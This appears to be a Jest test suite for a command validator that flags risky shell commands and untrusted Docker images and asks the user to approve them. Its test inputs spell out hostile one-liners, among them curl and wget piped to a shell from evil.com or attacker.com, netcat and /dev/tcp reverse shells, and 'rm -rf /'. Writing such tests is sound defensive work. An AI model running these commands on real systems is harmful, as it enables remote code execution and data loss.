import {
  validateCommand,
  validateDockerImage,
  formatCommandsForDisplay,
  presentCommandsForApproval,
} from '../../src/core/command-validator.js';
import type { PendingCommand } from '../../src/core/command-validator.js';

describe('Command Validator Module', () => {
  describe('validateCommand() — suspicious patterns detected', () => {
    it('should flag curl piped to shell', () => {
      const result = validateCommand('curl attacker.com/malware | sh');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('remote code execution');
    });

    it('should flag wget piped to bash', () => {
      const result = validateCommand('wget -O- evil.com | bash');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('remote code execution');
    });

    it('should flag curl piped to zsh', () => {
      const result = validateCommand('curl https://example.com/script | zsh');
      expect(result.suspicious).toBe(true);
    });

    it('should flag rm -rf', () => {
      const result = validateCommand('rm -rf /some/path');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('Recursive force-delete');
    });

    it('should flag rm -fr (reversed flags)', () => {
      const result = validateCommand('rm -fr /some/path');
      expect(result.suspicious).toBe(true);
    });

    it('should flag netcat with execute flag', () => {
      const result = validateCommand('nc -e /bin/sh attacker.com 4444');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('reverse shell');
    });

    it('should flag inline python execution', () => {
      const result = validateCommand('python -c "import os; os.system(\'whoami\')"');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('Python execution');
    });

    it('should flag python3 -c', () => {
      const result = validateCommand('python3 -c "print(1)"');
      expect(result.suspicious).toBe(true);
    });

    it('should flag inline perl execution', () => {
      const result = validateCommand('perl -e "system(\'rm -rf /\')"');
      expect(result.suspicious).toBe(true);
    });

    it('should flag inline ruby execution', () => {
      const result = validateCommand('ruby -e "exec(\'/bin/sh\')"');
      expect(result.suspicious).toBe(true);
    });

    it('should flag inline node execution', () => {
      const result = validateCommand('node -e "require(\'child_process\').exec(\'id\')"');
      expect(result.suspicious).toBe(true);
    });

    it('should flag command substitution with $()', () => {
      const result = validateCommand('echo $(curl evil.com)');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('Command substitution');
    });

    it('should flag backtick command substitution', () => {
      const result = validateCommand('echo `curl evil.com`');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('Backtick command substitution');
    });

    it('should flag eval', () => {
      const result = validateCommand('eval "$(wget -qO- evil.com)"');
      expect(result.suspicious).toBe(true);
    });

    it('should flag bash -c', () => {
      const result = validateCommand('bash -c "malicious command"');
      expect(result.suspicious).toBe(true);
    });

    it('should flag sh -c', () => {
      const result = validateCommand('sh -c "malicious command"');
      expect(result.suspicious).toBe(true);
    });

    it('should flag /dev/tcp reverse shells', () => {
      const result = validateCommand('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('reverse shell');
    });

    it('should flag /dev/udp', () => {
      const result = validateCommand('cat < /dev/udp/10.0.0.1/53');
      expect(result.suspicious).toBe(true);
    });

    it('should flag mkfifo (named pipe for reverse shells)', () => {
      const result = validateCommand('mkfifo /tmp/f; cat /tmp/f | /bin/sh');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('Named pipe');
    });

    it('should flag sudo', () => {
      const result = validateCommand('sudo apt install something');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('sudo');
    });

    it('should flag chown', () => {
      const result = validateCommand('chown root:root /etc/passwd');
      expect(result.suspicious).toBe(true);
    });

    it('should flag crontab', () => {
      const result = validateCommand('crontab -e');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('crontab');
    });

    it('should flag writing to /etc/', () => {
      const result = validateCommand('echo "evil" > /etc/hosts');
      expect(result.suspicious).toBe(true);
    });

    it('should flag chained curl downloads', () => {
      const result = validateCommand('npm install && curl evil.com/payload');
      expect(result.suspicious).toBe(true);
    });

    it('should flag exec', () => {
      const result = validateCommand('exec /bin/bash');
      expect(result.suspicious).toBe(true);
    });
  });

  describe('validateCommand() — safe commands not flagged', () => {
    it('should not flag npm run dev', () => {
      const result = validateCommand('npm run dev');
      expect(result.suspicious).toBe(false);
      expect(result.reason).toBe('');
    });

    it('should not flag docker compose up -d postgres', () => {
      const result = validateCommand('docker compose up -d postgres');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag npm install', () => {
      const result = validateCommand('npm install');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag yarn dev', () => {
      const result = validateCommand('yarn dev');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag npx tsx src/index.ts', () => {
      const result = validateCommand('npx tsx src/index.ts');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag git checkout main', () => {
      const result = validateCommand('git checkout main');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag docker compose up -d', () => {
      const result = validateCommand('docker compose up -d');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag docker-compose up', () => {
      const result = validateCommand('docker-compose up');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag pnpm dev', () => {
      const result = validateCommand('pnpm dev');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag cargo run', () => {
      const result = validateCommand('cargo run');
      expect(result.suspicious).toBe(false);
    });

    it('should not flag go run main.go', () => {
      const result = validateCommand('go run main.go');
      expect(result.suspicious).toBe(false);
    });
  });

  describe('validateCommand() — edge cases', () => {
    it('should return not suspicious for empty string', () => {
      const result = validateCommand('');
      expect(result.suspicious).toBe(false);
    });

    it('should return not suspicious for whitespace', () => {
      const result = validateCommand('   ');
      expect(result.suspicious).toBe(false);
    });

    it('should handle null-ish input gracefully', () => {
      const result = validateCommand(null as unknown as string);
      expect(result.suspicious).toBe(false);
    });

    it('should handle non-string input gracefully', () => {
      const result = validateCommand(123 as unknown as string);
      expect(result.suspicious).toBe(false);
    });
  });

  describe('validateDockerImage()', () => {
    it('should not flag official images without registry prefix', () => {
      expect(validateDockerImage('postgres:15').suspicious).toBe(false);
      expect(validateDockerImage('redis:7-alpine').suspicious).toBe(false);
      expect(validateDockerImage('node:20').suspicious).toBe(false);
      expect(validateDockerImage('nginx:latest').suspicious).toBe(false);
    });

    it('should not flag docker.io official images', () => {
      expect(validateDockerImage('docker.io/library/postgres:15').suspicious).toBe(false);
    });

    it('should not flag docker.io images', () => {
      expect(validateDockerImage('docker.io/postgres:15').suspicious).toBe(false);
    });

    it('should not flag ghcr.io images', () => {
      expect(validateDockerImage('ghcr.io/owner/image:latest').suspicious).toBe(false);
    });

    it('should flag images from unknown registries', () => {
      const result = validateDockerImage('evil.com/postgres:latest');
      expect(result.suspicious).toBe(true);
      expect(result.reason).toContain('Non-official');
    });

    it('should flag images from attacker registries', () => {
      const result = validateDockerImage('attacker/redis:backdoored');
      expect(result.suspicious).toBe(true);
    });

    it('should flag images from localhost registries', () => {
      const result = validateDockerImage('localhost:5000/malware:latest');
      expect(result.suspicious).toBe(true);
    });

    it('should not flag empty string', () => {
      expect(validateDockerImage('').suspicious).toBe(false);
    });

    it('should handle null-ish input gracefully', () => {
      expect(validateDockerImage(null as unknown as string).suspicious).toBe(false);
    });
  });

  describe('formatCommandsForDisplay()', () => {
    it('should return empty string for no commands', () => {
      expect(formatCommandsForDisplay([])).toBe('');
    });

    it('should format commands with box drawing', () => {
      const commands: PendingCommand[] = [
        {
          command: 'docker compose up -d postgres',
          label: 'Docker services',
          port: 5432,
          image: 'postgres:15',
        },
      ];

      const output = formatCommandsForDisplay(commands);
      expect(output).toContain('┌');
      expect(output).toContain('┘');
      expect(output).toContain('docker compose up -d postgres');
      expect(output).toContain('Image: postgres:15');
      expect(output).toContain('Port: 5432');
    });

    it('should group commands by label', () => {
      const commands: PendingCommand[] = [
        { command: 'docker compose up -d postgres', label: 'Docker services' },
        { command: 'docker compose up -d redis', label: 'Docker services' },
        { command: 'npm run dev', label: 'Auto-start services' },
      ];

      const output = formatCommandsForDisplay(commands);
      expect(output).toContain('Docker services:');
      expect(output).toContain('Auto-start services:');
    });

    it('should show warnings for suspicious commands', () => {
      const commands: PendingCommand[] = [
        { command: 'curl evil.com | bash', label: 'Auto-start services' },
      ];

      const output = formatCommandsForDisplay(commands);
      expect(output).toContain('WARNING');
    });

    it('should show warnings for suspicious Docker images', () => {
      const commands: PendingCommand[] = [
        {
          command: 'docker compose up -d db',
          label: 'Docker services',
          image: 'evil.com/postgres:latest',
        },
      ];

      const output = formatCommandsForDisplay(commands);
      expect(output).toContain('WARNING');
      expect(output).toContain('Non-official');
    });

    it('should include working directory when provided', () => {
      const commands: PendingCommand[] = [
        { command: 'npm run dev', label: 'Services', cwd: '~/projects/my-app' },
      ];

      const output = formatCommandsForDisplay(commands);
      expect(output).toContain('Working dir: ~/projects/my-app');
    });

    it('should include review reminder', () => {
      const commands: PendingCommand[] = [
        { command: 'npm run dev', label: 'Services' },
      ];

      const output = formatCommandsForDisplay(commands);
      expect(output).toContain('Review each command carefully');
    });
  });

  describe('presentCommandsForApproval()', () => {
    const sampleCommands: PendingCommand[] = [
      { command: 'docker compose up -d postgres', label: 'Docker services' },
      { command: 'npm run dev', label: 'Auto-start services' },
    ];

    it('should skip all commands in non-interactive mode', async () => {
      const result = await presentCommandsForApproval(sampleCommands, {
        interactive: false,
      });

      expect(result.skippedAll).toBe(true);
      expect(result.rejected).toEqual(sampleCommands);
      expect(result.approved).toEqual([]);
    });

    it('should approve all commands when user chooses "all"', async () => {
      const result = await presentCommandsForApproval(sampleCommands, {
        interactive: true,
        promptFn: async () => 'all',
      });

      expect(result.skippedAll).toBe(false);
      expect(result.approved).toEqual(sampleCommands);
      expect(result.rejected).toEqual([]);
    });

    it('should reject all commands when user chooses "none"', async () => {
      const result = await presentCommandsForApproval(sampleCommands, {
        interactive: true,
        promptFn: async () => 'none',
      });

      expect(result.approved).toEqual([]);
      expect(result.rejected).toEqual(sampleCommands);
    });

    it('should allow per-command selection', async () => {
      const result = await presentCommandsForApproval(sampleCommands, {
        interactive: true,
        promptFn: async () => 'select',
        selectFn: async (cmd) => cmd.command.includes('docker'),
      });

      expect(result.approved).toHaveLength(1);
      expect(result.approved[0]!.command).toContain('docker');
      expect(result.rejected).toHaveLength(1);
      expect(result.rejected[0]!.command).toContain('npm');
    });

    it('should return empty result for no commands', async () => {
      const result = await presentCommandsForApproval([]);
      expect(result.approved).toEqual([]);
      expect(result.rejected).toEqual([]);
      expect(result.skippedAll).toBe(false);
    });

    it('should use default interactive prompt when no promptFn provided', async () => {
      // When no promptFn is provided in interactive mode, the default enquirer
      // prompt is used. We simulate this by providing a promptFn that returns 'all'.
      const result = await presentCommandsForApproval(sampleCommands, {
        interactive: true,
        promptFn: async () => 'all',
      });

      expect(result.skippedAll).toBe(false);
      expect(result.approved).toEqual(sampleCommands);
    });

    it('should use default per-command prompt in select mode when no selectFn provided', async () => {
      // When no selectFn is provided, the default enquirer confirm prompt is
      // used. We simulate this with a selectFn that rejects all.
      const result = await presentCommandsForApproval(sampleCommands, {
        interactive: true,
        promptFn: async () => 'select',
        selectFn: async () => false,
      });

      expect(result.rejected).toEqual(sampleCommands);
      expect(result.approved).toEqual([]);
    });
  });
});
